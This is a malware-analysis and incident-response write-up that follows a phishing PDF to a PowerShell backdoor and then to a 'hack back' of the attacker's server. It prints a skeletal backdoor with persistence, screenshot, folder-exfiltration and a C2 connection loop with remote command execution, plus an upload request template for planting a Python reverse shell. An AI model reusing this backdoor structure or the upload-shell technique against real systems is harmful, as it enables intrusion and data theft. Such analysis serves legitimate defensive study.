# 🛡️ Hunting the Hunter: From Phishing PDF to C2 Server Takeover 🛡️

**Date:** April 2026  
**Category:** 📑 Malware Analysis | 🐚 Reverse Shell | ⚔️ Offensive Security  
**Case Type:** Incident Response & Threat Hunting

---

## 📝 1. Executive Summary
This report documents a deep-dive investigation into a targeted phishing campaign. The attack utilized a **multi-stage infection chain**: starting with a weaponized PDF, moving to a persistent PowerShell-based RAT (Remote Access Trojan), and ending with an exfiltration server. 

> **The Turning Point:** By analyzing the attacker's "Data Receiver" infrastructure, I discovered a misconfigured **OpenAPI** endpoint. This allowed me to pivot from a defensive posture to an offensive one, gaining a **Reverse Shell** on the attacker’s own server to verify the breach's impact.

---

## 📧 2. Phase 1: The Initial Hook (The Bait)
The attack vector was a suspicious email 📩 containing a PDF masquerading as an Adobe update.

* **The Sandbox:** 🧪 Analyzed in an isolated Windows 10 VM.
* **The Social Engineering:** 🎭 Opening the PDF redirected the user to a fake `adobeupdate` page. 
* **The Suppression:** ✨ To hide its tracks, the site instantly redirected to the **official Adobe website** after the malicious download began.
* **The Payload:** 📦 An executable (`.exe`) was dropped and manually executed for behavioral monitoring.

---

## 🔍 3. Phase 2: Malware Deep Dive (The "Windows Update Monitor")
Using **Sysinternals ProcMon** and **TCPView** 🛠️, I identified the true nature of the infection: a sophisticated PowerShell backdoor.

### ⚙️ Malicious Capabilities:
* **Persistence:** 🔁 The script creates a Scheduled Task named **"Windows Update Monitor"** to relaunch every 5 minutes.
* **Stealth:** 🛡️ Uses a **Global Mutex** (`Global\WinUpdateMon...`) to ensure only one instance runs, avoiding system lag.
* **Spyware:** 📸 Includes a `Take-Screenshot` function to capture the user's desktop.
* **Exfiltration:** 🤐 Contains a `Zip-And-Send-Folder` function to archive and steal entire directories.
* **Redundancy:** 🌐 Hardcoded with **3 fallback C2 domains** (`REDACTED-C2-A.net`, etc.) to survive server takedowns.

```
# --- SANITIZED MALWARE SOURCE (EDUCATIONAL USE ONLY) ---

# 1. PERSISTENCE: Sets a Scheduled Task to relaunch every 5 minutes
# Masquerades as "Windows Update Monitor"
function Ensure-ScheduledTaskPersistence {
    # ... logic to register task as 'SYSTEM' or current User ...
}

# 2. EXFILTRATION: Compresses folders and sends them to C2
function Zip-And-Send-Folder {
    param ([System.IO.Stream]$stream, [string]$folderName)
    # Uses System.IO.Compression.ZipFile to archive data on the fly
}

# 3. SPYWARE: Captures the victim's screen
function Take-Screenshot {
    # Uses System.Drawing to capture the primary screen and send it via the stream
}

# 4. COMMAND & CONTROL (C2) CONFIGURATION
# The script rotates through multiple hardcoded domains to bypass DNS blocking
$servers = @("REDACTED-C2-A.net", "REDACTED-C2-B.org", "REDACTED-C2-C.tk")
$port = 41017

# 5. REVERSE SHELL LOOP
while ($true) {
    foreach ($server in $servers) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient($server, $port)
            $stream = $client.GetStream()
            
            # Attacker can send commands like:
            # "screenshot" -> Triggers Take-Screenshot
            # "download [file]" -> Exfiltrates specific files
            # "folder [name]" -> Zips and exfiltrates entire directories
            # "cd [path]" -> Navigates the filesystem
            # "[any other string]" -> Executed via Invoke-Expression (RCE)
        } catch { 
            # Failover to next server 
        }
    }
    Start-Sleep -Seconds 5
}
```

---

## 🌐 4. Phase 3: Infrastructure Reconnaissance
I pivoted to analyzing the attacker’s backend. One IP hosted a Python-based web app called **"Data Receiver."**

* **Discovery:** 🔍 Directory fuzzing revealed an exposed **OpenAPI/Swagger** configuration file.
* **The Vulnerability:** 📖 The documentation exposed an `/upload` endpoint that accepted file uploads via a raw HTML-form-style request.

---

## 🐚 5. Phase 4: Flipping the Script (Exploitation)
The `/upload` API required a specific multi-line format: `filename`, `extension`, and `data`. There was **zero server-side validation** on the file extension.

### 🚀 The Exploit Payload:
I crafted a Python reverse shell and sent it using the following request structure:

```http
POST /api/upload HTTP/1.1
Content-Type: application/x-www-form-urlencoded

filename=shell
extension=py
data=[BASE64_ENCODED_PYTHON_SHELL]
```
